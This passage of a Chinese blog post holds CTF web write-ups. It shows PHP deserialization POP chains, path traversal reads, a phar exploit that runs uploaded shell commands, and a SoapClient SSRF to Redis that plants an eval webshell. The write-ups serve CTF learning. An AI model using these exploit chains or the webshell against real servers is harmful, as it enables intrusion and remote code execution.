+</span></span><span style="display:flex;"><span>$s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">sorry</span>(<span style="color:#e6db74">&#39;aaa&#39;</span>,<span style="color:#e6db74">&#39;aaa&#39;</span>,<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">show</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">secret_code</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">sorry</span>(<span style="color:#e6db74">&#39;aaa&#39;</span>,<span style="color:#e6db74">&#39;aaa&#39;</span>,<span style="color:#e6db74">&#39;aaa&#39;</span>,<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">fine</span>(<span style="color:#e6db74">&#39;system&#39;</span>,<span style="color:#e6db74">&#39;cat /flag&#39;</span>)))),<span style="color:#e6db74">&#39;aaa&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($s));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//4,get -&gt; invoke
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//3,show() -&gt; get
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//2,toString -&gt; show()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//1,destruct -&gt; toString
+</span></span></span></code></pre></div><p>这里我设置name和password都为aaa，可能正好绕过了 随机密码这个地方，可以打通</p>
+<pre tabindex="0"><code>其实步骤里还差一个永真表达式 就是让
+$this-&gt;password=&amp;$this-&gt;name
+</code></pre><p>注意一定要在代码中进行url编码 ，然后绕wakeup时候手动修改类个数即可</p>
+<h2 id="hade_waibo">hade_waibo</h2>
+<pre tabindex="0"><code>小明为了每日欣赏美少女，专门写了一个平台供网友分享与浏览，结果却被可恶的黑客入侵并留下一个恶作剧，你能帮他看一看吗? tips:flag在/目录下的一个文件里
+</code></pre><p>有个输入用户名登录，进去有上传点，并且可以search文件</p>
+<p>这种就很像phar反序列化，之前也有非预期直接读/flag</p>
+<p>这题还能非预期！ 看看</p>
+<p>在search界面</p>
+<pre tabindex="0"><code>/file.php?m=show&amp;filename=../../../../start.sh
+</code></pre><p>然后搜到损坏的图，打开后看源码 里面有flag的文件名信息</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210291724488.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210291724488.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210291724488.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210291724488.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210291724488.png"
+        title="image-20221029172446135" /></p>
+<p>start.sh是执行脚本文件  , 这方法有趣</p>
+<pre tabindex="0"><code>/file.php?m=show&amp;filename=../../../../ghjsdk_F149_H3re_asdasfc
+</code></pre><p>同样的方法得到flag</p>
+<p>filename=class.php读到源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
+</span></span><span style="display:flex;"><span>        $_SESSION[<span style="color:#e6db74">&#39;isLogin&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>;
+</span></span><span style="display:flex;"><span>        $_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> $username;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup(){
+</span></span><span style="display:flex;"><span>        $cklen <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($_SESSION[<span style="color:#e6db74">&#34;username&#34;</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($cklen <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">and</span> $cklen <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">6</span>) {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#34;username&#34;</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">session_destroy</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">File</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#更新黑名单为白名单，更加的安全
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $white <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;jpg&#34;</span>,<span style="color:#e6db74">&#34;png&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>($filename){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;ui action input&#34;&gt;&lt;input type=&#34;text&#34; id=&#34;filename&#34; placeholder=&#34;Search...&#34;&gt;&lt;button class=&#34;ui button&#34; onclick=&#34;window.location.href=\&#39;file.php?m=show&amp;filename=\&#39;+document.getElementById(\&#39;filename\&#39;).value&#34;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($filename)){<span style="color:#66d9ef">die</span>();}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;data:image/png;base64,&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($filename))<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34; /&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload</span>($type){
+</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dasctf&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">time</span>()<span style="color:#f92672">.</span>$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.</span><span style="color:#e6db74">$type</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], <span style="color:#e6db74">&#34;upload/&#34;</span> <span style="color:#f92672">.</span> $filename);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Upload success! Path: upload/&#34;</span> <span style="color:#f92672">.</span> $filename;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">rmfile</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;rm -rf /var/www/html/upload/*&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>($type){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($type,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">white</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#更新了一个恶意又有趣的Test类
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $value;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#39;./upload&#39;</span>);
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">backdoor</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Don&#39;t make dream.Wake up plz!&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
+</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>],<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">file_put_contents</span>($file, <span style="color:#e6db74">&#34;Hack by </span><span style="color:#e6db74">$file</span><span style="color:#e6db74"> !&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Unreachable! :)&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">backdoor</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[A-Za-z0-9?$@]+/&#39;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span>)){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nono~&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>先去找链子，<code>Test类</code>中的<code>backdoor</code>里面的<code>system</code>函数可以执行命令</p>
+<p>但是有正则过滤 ， 无字母数字和三个符号，且system不能执行异或、取反这些</p>
+<p><code>__wakeup</code>因为版本问题无法绕过（PHP5&lt;5.6.25，PHP7 &lt; 7.0.10可以绕），那如何让<code>value</code>的值不变呢，我们只需要让<code>value</code>指向一个变量的地址，这样就不会变了</p>
+<p>在保证 <code>value</code> 不会被改变的情况下，怎么绕过 <code>preg_match</code> 执行 <code>shell</code> 呢？这边又有一个小知识点：在 linux 中，<code>. ./*</code> 会把当前目录下的所有文件当作 sh 文件执行。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210301631902.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210301631902.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210301631902.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210301631902.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210301631902.png"
+        title="image-20221030163108662" /></p>
+<p>这里就是<code>. ./*</code>执行了该目录下1.jpg里面的命令</p>
+<p>所以这题可以上传一个这样1.jpg</p>
+<pre tabindex="0"><code>#!/bin/sh
+ls /
+</code></pre><p>问题又来了，怎么令<code> value</code> 为 <code>. ./*</code> 呢？我们接着看 <code>User</code>类，在 _<code>_wakeup</code> 中<code> $this-&gt;username = $_SESSION[&quot;username&quot;];</code>，也就是<code> $this-&gt;username == 我们的登录名</code>，那么我们是就可以在登录时，以 <code>. ./* </code>为登录名，然后令 <code>Test </code>类中的<code> value</code> 指向<code> username</code>，因为 <code>username </code>是可控的。</p>
+<p>poc如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $value;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
+</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>();
+</span></span><span style="display:flex;"><span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>(); 
+</span></span><span style="display:flex;"><span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">=</span> $test;  <span style="color:#75715e">//这句不太理解，这句的用途是可以顺利调用value
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($user);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#34;phar.phar&#34;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>); <span style="color:#75715e">//设置stub
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($user); <span style="color:#75715e">//将自定义的meta-data存入manifest
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>); <span style="color:#75715e">//添加要压缩的文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//签名自动计算
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rename</span>(<span style="color:#e6db74">&#34;phar.phar&#34;</span>, <span style="color:#e6db74">&#34;test.jpg&#34;</span>);
+</span></span></code></pre></div><p>这里为何还需要User对象用一个不存在的属性实例化 Test()类，确实不太理解，有和没有的区别如下</p>
+<pre tabindex="0"><code>O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;O:4:&#34;Test&#34;:1:{s:5:&#34;value&#34;;N;}s:1:&#34;a&#34;;O:4:&#34;Test&#34;:1:{s:5:&#34;value&#34;;R:2;}}
+
+O:4:&#34;User&#34;:1:{s:8:&#34;username&#34;;O:4:&#34;Test&#34;:1:{s:5:&#34;value&#34;;N;}}
+</code></pre><p>看师傅们的博客大概是能顺利调用value，</p>
+<p>上传1.jpg 后 用 <code>. ./*</code>作为用户名登录 ，然后上传phar文件</p>
+<p>读取1.jpg 来实现 <code>ls /</code></p>
+<p>未复现成功，哪里出问题了。。大佬们指引一下</p>
+<h2 id="easylove">EasyLove</h2>
+<blockquote>
+<p>Redis是世界上最好的数据库！</p>
+</blockquote>
+<p>进来后是源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">swpu</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $wllm;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $arsenetang;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $l61q4cheng;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $love;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($wllm,$arsenetang,$l61q4cheng,$love){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wllm</span> <span style="color:#f92672">=</span> $wllm;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">arsenetang</span> <span style="color:#f92672">=</span> $arsenetang;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">l61q4cheng</span> <span style="color:#f92672">=</span> $l61q4cheng;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">love</span> <span style="color:#f92672">=</span> $love;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">newnewnew</span>(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">love</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wllm</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">arsenetang</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">l61q4cheng</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flag</span>(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">love</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getflag</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">newnewnew</span>();
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">flag</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">hint</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hint;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">hint</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;hint.php&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$hello <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;hello&#39;</span>];
+</span></span><span style="display:flex;"><span>$world <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($hello);  
+</span></span></code></pre></div><p>有个hint,去读一下 , file_get_contents 用 伪协议读hint.php源码</p>
+<p>构造<code> file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/hint.php&quot;)</code></p>
+<p>也就是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">hint</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;php://filter/read=convert.base64-encode/resource=/var/www/html/&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">hint</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($s);
+</span></span></code></pre></div><p>传进去后得到</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031105068.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031105068.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031105068.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031105068.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031105068.png"
+        title="image-20221103110537743" /></p>
+<p>也就是可能Redis的密码 是20220311</p>
+<p>到这里不太懂了，去了解了解ssrf打redis，多看看一些文章和wp</p>
+<p><a href="https://blog.csdn.net/m0_62422842/article/details/127553366" target="_blank" rel="noopener noreffer">https://blog.csdn.net/m0_62422842/article/details/127553366</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">newnewnew</span>(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">love</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wllm</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">arsenetang</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">l61q4cheng</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flag</span>(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">love</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getflag</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>首先destruct就直接调用了这两个方法，newnewnew()里面的参数我们是可控的属性，flag()里调用了不存在的方法</p>
+<p>可以触发SoapClient原生类的call方法，那么利用条件满足，关于<code>SoapClient原生类的call方法</code> 看这篇文章</p>
+<p><a href="https://blog.csdn.net/qq_38154820/article/details/119952852" target="_blank" rel="noopener noreffer">https://blog.csdn.net/qq_38154820/article/details/119952852</a>
+</p>
+<p>SoapClient类需要两个参数，第一个参数通常指明是否是wsdl模式，我们构造的时候通常为Null，第二个参数是个数组.</p>
+<p>只能先大概理解一下了，可以通过uri选项向内网redis发指令写木马</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">AUTH</span> <span style="color:#ae81ff">20220311</span> <span style="color:#75715e">//验证客户端链接
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">CONFIG</span> <span style="color:#a6e22e">SET</span> <span style="color:#a6e22e">dir</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span>  <span style="color:#75715e">//设置写入的目录
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">SET</span> <span style="color:#a6e22e">x</span> <span style="color:#e6db74">&#39;&lt;?@eval(\$_POST[1]);?&gt;&#39;</span>  <span style="color:#75715e">//设置写入的内容 这里不要有空格的好
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">CONFIG</span> <span style="color:#a6e22e">SET</span> <span style="color:#a6e22e">dbfilename</span> <span style="color:#a6e22e">hack</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>  <span style="color:#75715e">//设置写入的文件名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">SAVE</span>  <span style="color:#75715e">//保存结束
+</span></span></span></code></pre></div><p>写一下脚本了，redis一般在6379端口</p>
+<p>exp里面 $option 是一个数组，必须设置<code>location</code>和<code>uri</code>，<code>uri</code>就是上面的指令，以\r\n隔开</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:6379&#34;</span>;
